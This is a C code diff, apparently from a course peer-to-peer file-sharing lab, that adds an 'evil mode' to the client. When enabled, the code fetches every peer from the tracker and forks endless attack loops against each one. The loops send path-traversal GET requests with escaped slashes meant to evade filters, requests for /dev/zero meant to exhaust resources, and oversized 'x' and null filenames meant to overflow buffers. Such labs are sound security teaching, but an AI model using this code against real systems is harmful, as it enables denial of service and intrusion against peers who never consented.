@@ -472,13 +472,22 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	size_t messagepos;
 	assert(tracker_task->type == TASK_TRACKER);
 
+	// Permit the filename argument to be null in evil mode. We're
+	// grabbing all possible peers anyway so a specific file isn't needed
+	if(evil_mode)
+		filename = "";
+
 	message("* Finding peers for '%s'\n", filename);
 
-	osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+	if(evil_mode) // Attack all connected peers if running in evil mode!
+		osp2p_writef(tracker_task->peer_fd, "WHO\n");
+	else
+		osp2p_writef(tracker_task->peer_fd, "WANT %s\n", filename);
+
 	messagepos = read_tracker_response(tracker_task);
 	if (tracker_task->buf[messagepos] != '2') {
 		error("* Tracker error message while requesting '%s':\n%s",
-		      filename, &tracker_task->buf[messagepos]);
+		      (evil_mode ? "all victims" : filename), &tracker_task->buf[messagepos]);
 		goto exit;
 	}
 
@@ -492,13 +501,13 @@ task_t *start_download(task_t *tracker_task, const char *filename)
 	s1 = tracker_task->buf;
 	while ((s2 = memchr(s1, '\n', (tracker_task->buf + messagepos) - s1))) {
 		if (!(p = parse_peer(s1, s2 - s1)))
-			die("osptracker responded to WANT command with unexpected format!\n");
+			die("osptracker responded to %s command with unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
 		p->next = t->peer_list;
 		t->peer_list = p;
 		s1 = s2 + 1;
 	}
 	if (s1 != tracker_task->buf + messagepos)
-		die("osptracker's response to WANT has unexpected format!\n");
+		die("osptracker's response to %s has unexpected format!\n", (evil_mode ? "WHO" : "WANT"));
 
  exit:
 	return t;
@@ -777,6 +786,100 @@ static void task_upload(task_t *t)
 }
 
 
+// Issues download attacks on peers connected to the tracker. How despicable...
+void do_dastardly_things(task_t *tracker_task)
+{
+	task_t *t = start_download(tracker_task, NULL);
+
+	if(t == NULL)
+	{
+		error("Unable to get a list of victims, resorting to upload attacks only\n");
+		return;
+	}
+
+	while(t->peer_list != NULL)
+	{
+		pid_t pid;
+		if((pid = fork()) < 0)
+		{
+			error("Unable to fork any more attacks\n");
+			task_free(t);
+			return;
+		}
+
+		// Parent
+		if(pid > 0)
+		{
+			task_pop_peer(t);
+			continue;
+		}
+
+		// Otherwise we are in the child process!
+		message("* Attacking %s:%d\n", inet_ntoa(t->peer_list->addr), t->peer_list->port);
+		srand(time(NULL));
+
+		while(1)
+		{
+			// Reopen new connections to the peer every time
+			t->peer_fd = open_socket(t->peer_list->addr, t->peer_list->port);
+
+			if (t->peer_fd == -1) {
+				task_free(t);
+				exit(1);
+			}
+
+			// Pick a path to attack with and connect to the peer and write the GET command
+			switch(rand() % 4)
+			{
+				case 0:
+					// Use an absolute path to /dev/zero with an "escaped" first slash
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", "\\/////////dev/zero");
+					break;
+				case 1:
+					// "escape" ../ paths to confuse defenses that simply check paths for "../" literal
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n",
+					"\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/dev/zero");
+					break;
+				case 2:
+				{
+					// Write a huge filepath to overflow some buffers.
+					// String is over 1024 chars, so it won't land on a power of 2 boundary
+					// in case they increased their buffer size
+					size_t size = 1030;
+					char *attack_buffer = malloc(sizeof(char) * size+1);
+					memset(attack_buffer, 'x', size);
+					attack_buffer[size] = '\0';
+
+					osp2p_writef(t->peer_fd, "GET %s OSP2P\n", attack_buffer);
+					break;
+				}
+				case 3:
+				default:
+				{
+					// Ditto but with nulls instead
+					size_t size = 1030;
+					char *attack_buffer = malloc(sizeof(char) * size+1);
+					memset(attack_buffer, '\0', size);
+
+					osp2p_writef(t->peer_fd, "GET ");
+					write(t->peer_fd, attack_buffer, size);
+					osp2p_writef(t->peer_fd, " OSP2P\n");
+					break;
+				}
+			}
+
+			close(t->peer_fd);
+		}
+
+		// If we've gotten this far, the child has no more attacks and should exit
+		task_free(t);
+		exit(0);
+	}
+
+	task_free(t);
+}
+
+
 // main(argc, argv)
 //	The main loop!
 int main(int argc, char *argv[])
@@ -859,9 +962,12 @@ int main(int argc, char *argv[])
 	if(listen_task == NULL)
 		die("unable to allocate listen_task\n");
 
+	if(evil_mode)
+		do_dastardly_things(tracker_task);
+
 	child_count = 0;
 	// First, download files named on command line.
-	for (; argc > 1; argc--, argv++)
+	for (; argc > 1 && !evil_mode; argc--, argv++)
 	{
 		if ((t = start_download(tracker_task, argv[1])))
 		{
